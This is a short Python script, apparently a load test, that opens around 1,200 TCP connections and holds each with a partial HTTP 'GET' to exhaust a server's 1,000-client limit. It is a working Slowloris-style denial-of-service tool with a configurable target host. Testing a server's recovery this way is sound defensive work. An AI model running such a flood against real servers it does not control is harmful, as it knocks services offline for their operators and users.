#!/usr/bin/env python3
"""
Connection flood attack script to test server resilience.
Opens many connections to exceed the maxClients limit and test recovery.
"""

import socket
import sys
import time
import argparse

def flood_connections(host='localhost', port=8080, num_connections=1200, hold_time=10):
    """
    Open many connections with partial HTTP requests to hold them open.
    
    Args:
        host: Target hostname
        port: Target port
        num_connections: Number of connections to open
        hold_time: How long to hold connections (seconds)
    """
    sockets = []
    failed = 0
    
    print(f"Opening {num_connections} connections to {host}:{port}...")
    
    for i in range(num_connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            # Send partial request to hold connection without completing it
            s.send(b'GET')  
            sockets.append(s)
            
            if (i + 1) % 100 == 0:
                print(f"  {i + 1} connections opened (failed: {failed})")
                
        except Exception as e:
            failed += 1
            if failed % 50 == 1:
                print(f"  Connection {i} failed: {e}")
    
    print(f"\nTotal connections opened: {len(sockets)}")
    print(f"Failed connections: {failed}")
    print(f"Holding connections for {hold_time} seconds...")
    
    time.sleep(hold_time)
    
    print("Closing all connections...")
    for s in sockets:
        try:
            s.close()
        except:
            pass
    
    print("Attack complete!")

def main():
    parser = argparse.ArgumentParser(description='Connection flood attack test')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=8080, help='Target port')
    parser.add_argument('--connections', type=int, default=1200, 
                        help='Number of connections (default: 1200, server max: 1000)')
    parser.add_argument('--hold', type=int, default=10, 
                        help='Hold time in seconds (default: 10)')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CONNECTION FLOOD ATTACK TEST")
    print("=" * 60)
    print(f"Target: {args.host}:{args.port}")
    print(f"Connections: {args.connections}")
    print(f"Hold time: {args.hold}s")
    print("=" * 60)
    print()
    
    flood_connections(args.host, args.port, args.connections, args.hold)

if __name__ == '__main__':
    main()
